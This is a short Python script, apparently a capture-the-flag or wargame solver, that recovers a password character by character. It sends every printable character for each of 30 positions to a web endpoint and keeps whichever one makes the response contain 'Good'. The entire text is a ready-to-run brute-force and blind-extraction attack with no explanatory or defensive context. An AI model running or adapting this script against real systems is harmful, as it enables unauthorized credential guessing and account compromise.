import urllib, requests, time

password = ''

for j in range(0, 30):
        for i in range(39, 127):
                try:
                        payload = {"no":j,"word":chr(i)}
                        headers = {"Content-Type":"application/x-www-form-urlencoded"}
                        r = requests.post("http://yeali.me/1/", data = payload, headers = headers)
                except:
                        print ("exception")
                        continue
                if "Good" in r.text:
                        password = password + chr(i)
                        print ("[+] " + str(j) + " 's password : " + password)
                        break

                time.sleep(0.1)
print ("[+] password : " + password)